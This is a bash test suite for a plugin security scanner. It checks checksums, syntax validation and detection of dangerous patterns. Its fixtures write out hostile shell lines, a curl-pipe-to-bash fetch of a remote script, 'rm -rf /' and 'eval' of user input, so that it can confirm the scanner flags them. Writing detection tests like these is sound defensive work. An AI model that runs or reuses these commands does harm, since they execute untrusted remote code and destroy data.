#!/bin/bash

# Potions Plugin Security Tests
# Tests for the security module and scanner

set -eo pipefail

TESTS_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PLUGINS_DIR="$(dirname "$TESTS_DIR")"
REPO_ROOT="$(dirname "$PLUGINS_DIR")"

source "$REPO_ROOT/packages/accessories.sh"
source "$PLUGINS_DIR/core/security.sh"
source "$PLUGINS_DIR/core/scanner.sh"

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Test helper functions
assert_true() {
  local condition="$1"
  local message="$2"
  
  TESTS_RUN=$((TESTS_RUN + 1))
  
  if eval "$condition"; then
    echo -e "${GREEN}✓${NC} $message"
    TESTS_PASSED=$((TESTS_PASSED + 1))
  else
    echo -e "${RED}✗${NC} $message"
    TESTS_FAILED=$((TESTS_FAILED + 1))
  fi
}

assert_false() {
  local condition="$1"
  local message="$2"
  
  TESTS_RUN=$((TESTS_RUN + 1))
  
  if ! eval "$condition"; then
    echo -e "${GREEN}✓${NC} $message"
    TESTS_PASSED=$((TESTS_PASSED + 1))
  else
    echo -e "${RED}✗${NC} $message"
    TESTS_FAILED=$((TESTS_FAILED + 1))
  fi
}

# Tests

test_is_local_plugin() {
  echo "Testing is_local_plugin..."
  
  assert_true "is_local_plugin '/path/to/plugin'" "Absolute path detected as local"
  assert_true "is_local_plugin '~/my-plugin'" "Home path detected as local"
  assert_true "is_local_plugin './local-plugin'" "Relative path detected as local"
  assert_false "is_local_plugin 'Rynaro/potions-docker'" "GitHub repo not detected as local"
  assert_false "is_local_plugin 'my-plugin'" "Simple name not detected as local"
}

test_calculate_checksum() {
  echo "Testing calculate_checksum..."
  
  # Create test file
  local test_file
  test_file=$(mktemp)
  echo "test content" > "$test_file"
  
  local checksum
  checksum=$(calculate_checksum "$test_file")
  
  assert_true "[ -n '$checksum' ]" "Checksum calculated"
  assert_true "[ ${#checksum} -eq 64 ]" "Checksum is SHA256 length (64 chars)"
  
  # Cleanup
  rm -f "$test_file"
}

test_verify_file_checksum() {
  echo "Testing verify_file_checksum..."
  
  # Create test file
  local test_file
  test_file=$(mktemp)
  echo "test content" > "$test_file"
  
  # Get actual checksum
  local checksum
  checksum=$(calculate_checksum "$test_file")
  
  # Test correct checksum
  assert_true "verify_file_checksum '$test_file' '$checksum'" "Correct checksum verifies"
  
  # Test incorrect checksum
  assert_false "verify_file_checksum '$test_file' 'wrong_checksum' 2>/dev/null" "Wrong checksum fails"
  
  # Cleanup
  rm -f "$test_file"
}

test_scan_dangerous_patterns() {
  echo "Testing scanner for dangerous patterns..."
  
  # Create temp directory for test files
  local temp_dir
  temp_dir=$(mktemp -d)
  
  # Test file with dangerous pattern
  cat > "$temp_dir/dangerous.sh" << 'EOF'
#!/bin/bash
curl -fsSL https://example.com/script.sh | bash
EOF
  
  assert_false "scan_file '$temp_dir/dangerous.sh' >/dev/null 2>&1" "Dangerous curl|bash detected"
  
  # Test file with safe content
  cat > "$temp_dir/safe.sh" << 'EOF'
#!/bin/bash
echo "Hello, World!"
log "Installing package..."
EOF
  
  assert_true "scan_file '$temp_dir/safe.sh' >/dev/null 2>&1" "Safe file passes scan"
  
  # Cleanup
  rm -rf "$temp_dir"
}

test_scan_eval_pattern() {
  echo "Testing scanner for eval patterns..."
  
  local temp_dir
  temp_dir=$(mktemp -d)
  
  # Test file with dangerous eval
  cat > "$temp_dir/eval_dangerous.sh" << 'EOF'
#!/bin/bash
user_input="$1"
eval "$user_input"
EOF
  
  assert_false "scan_file '$temp_dir/eval_dangerous.sh' >/dev/null 2>&1" "Dangerous eval detected"
  
  # Cleanup
  rm -rf "$temp_dir"
}

test_scan_rm_pattern() {
  echo "Testing scanner for rm patterns..."
  
  local temp_dir
  temp_dir=$(mktemp -d)
  
  # Test file with dangerous rm
  cat > "$temp_dir/rm_dangerous.sh" << 'EOF'
#!/bin/bash
rm -rf /
EOF
  
  assert_false "scan_file '$temp_dir/rm_dangerous.sh' >/dev/null 2>&1" "Dangerous rm -rf / detected"
  
  # Cleanup
  rm -rf "$temp_dir"
}

test_validate_script_syntax() {
  echo "Testing validate_script_syntax..."
  
  local temp_dir
  temp_dir=$(mktemp -d)
  
  # Valid script
  cat > "$temp_dir/valid.sh" << 'EOF'
#!/bin/bash
echo "Hello"
if [ -f "test" ]; then
  echo "exists"
fi
EOF
  
  assert_true "validate_script_syntax '$temp_dir/valid.sh'" "Valid script passes"
  
  # Invalid script
  cat > "$temp_dir/invalid.sh" << 'EOF'
#!/bin/bash
echo "Hello
if [ -f "test" ]; then
  echo "missing quote
fi
EOF
  
  assert_false "validate_script_syntax '$temp_dir/invalid.sh' 2>/dev/null" "Invalid script fails"
  
  # Cleanup
  rm -rf "$temp_dir"
}

test_quick_scan() {
  echo "Testing quick_scan..."
  
  local temp_dir
  temp_dir=$(mktemp -d)
  mkdir -p "$temp_dir/plugin"
  
  # Safe plugin with valid script
  cat > "$temp_dir/plugin/install.sh" << 'EOF'
#!/bin/bash
echo "Installing..."
mkdir -p "$HOME/.config"
EOF
  chmod +x "$temp_dir/plugin/install.sh"
  
  # quick_scan returns 0 for safe plugins
  local result=0
  quick_scan "$temp_dir/plugin" >/dev/null 2>&1 || result=$?
  assert_true "[ $result -eq 0 ]" "Safe plugin passes quick scan"
  
  # Cleanup
  rm -rf "$temp_dir"
}

# Run tests
run_tests() {
  echo ""
  echo "Running Plugin Security Tests"
  echo "=============================="
  echo ""
  
  test_is_local_plugin
  echo ""
  
  test_calculate_checksum
  echo ""
  
  test_verify_file_checksum
  echo ""
  
  test_scan_dangerous_patterns
  echo ""
  
  test_scan_eval_pattern
  echo ""
  
  test_scan_rm_pattern
  echo ""
  
  test_validate_script_syntax
  echo ""
  
  test_quick_scan
  echo ""
  
  # Summary
  echo "=============================="
  echo "Tests run: $TESTS_RUN"
  echo -e "Passed: ${GREEN}$TESTS_PASSED${NC}"
  echo -e "Failed: ${RED}$TESTS_FAILED${NC}"
  echo ""
  
  if [ $TESTS_FAILED -gt 0 ]; then
    exit 1
  fi
}

run_tests
